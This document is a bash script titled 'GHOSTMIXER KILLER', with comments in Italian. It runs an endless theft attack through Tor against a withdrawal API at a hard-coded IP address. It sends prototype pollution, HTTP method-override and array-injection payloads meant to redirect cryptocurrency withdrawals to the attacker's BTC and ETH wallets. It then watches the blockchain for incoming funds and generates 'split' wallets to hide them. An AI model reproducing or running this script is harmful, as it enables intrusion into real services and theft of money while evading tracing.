#!/bin/bash
# ðŸ”¥ GHOSTMIXER KILLER v12.0 - TOR ATTIVO + WALLET FILE

set -e

# ========== CONFIG ==========
TARGET="http://206.189.145.165:3001/api/withdraw"
WALLET_FILE="$HOME/ghostmixer/wallets-fixed.txt"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# ========== LOAD WALLETS ==========
load_wallets() {
    source "$WALLET_FILE"
    echo -e "${GREEN}âœ… Wallets caricati:${NC}"
    echo "   ðŸ’° BTC: $BTC_WALLET"
    echo "   ðŸ’Ž ETH: $ETH_WALLET"
}

# ========== TOR SIMPLE CHECK ==========
tor_check() {
    if ! timeout 3 torsocks curl -s "http://icanhazip.com" >/dev/null 2>&1; then
        echo -e "${RED}âŒ TOR non funziona! Avvia tor${NC}"
        exit 1
    fi
    echo -e "${GREEN}âœ… TOR attivo${NC}"
}

# ========== SPLIT WALLETS ==========
gen_split() {
    echo -e "${BLUE}ðŸŽ² 10 Split wallets:${NC}"
    rm -f split.txt
    for i in {1..10}; do
        split="bc1q$(openssl rand -hex 10 | xxd -r -p | base58)"
        echo "$split"
        echo "$split" >> split.txt
    done
}

# ========== CVE ATTACKS ==========
attack_pollution() {
    echo -e "${YELLOW}ðŸ’¥ Pollution:${NC}"
    
    torsocks curl -s -X POST "$TARGET" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "constructor[prototype][to]=$BTC_WALLET&constructor[prototype][amount]=1" >/dev/null 2>&1
    
    torsocks curl -s -X POST "$TARGET" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "__proto__[to]=$ETH_WALLET&__proto__[amount]=0.5" >/dev/null 2>&1
}

attack_override() {
    echo -e "${YELLOW}ðŸ”“ Override:${NC}"
    
    torsocks curl -s -X GET "$TARGET" \
        -H "X-HTTP-Method-Override: POST" \
        -d "{\"to\":\"$BTC_WALLET\",\"amount\":0.3}" >/dev/null 2>&1
}

attack_array() {
    echo -e "${YELLOW}ðŸ“¦ Array:${NC}"
    
    torsocks curl -s -X POST "$TARGET" \
        -d "to[]=constructor&to[][prototype][to]=$BTC_WALLET" >/dev/null 2>&1
}

# ========== FULL WAVE ==========
full_wave() {
    echo -e "${BLUE}ðŸš€ WAVE START${NC}"
    attack_pollution
    attack_override
    attack_array
    echo -e "${GREEN}âœ… WAVE DONE${NC}"
}

# ========== MONITOR ==========
monitor() {
    echo -e "${BLUE}ðŸ‘€ Monitoring...${NC}"
    while true; do
        sats=$(torsocks curl -s "https://blockstream.info/api/address/$BTC_WALLET" 2>/dev/null | grep -o '[0-9]*' | head -1 || echo 0)
        
        if [[ $sats != "0" ]]; then
            echo -e "${RED}ðŸ’° VITTORIA: $sats sats!${NC}"
            gen_split
            echo "Split wallets salvati â†’ split.txt"
            break
        fi
        
        echo "$(date '+%H:%M') BTC: $sats sats"
        sleep 20
    done
}

# ========== MAIN ==========
echo -e "${RED}ðŸ’€ GHOSTMIXER KILLER v12${NC}"
load_wallets
tor_check

# Attack + Monitor
full_wave
monitor &

# Infinite attacks
while true; do
    sleep 120
    full_wave
done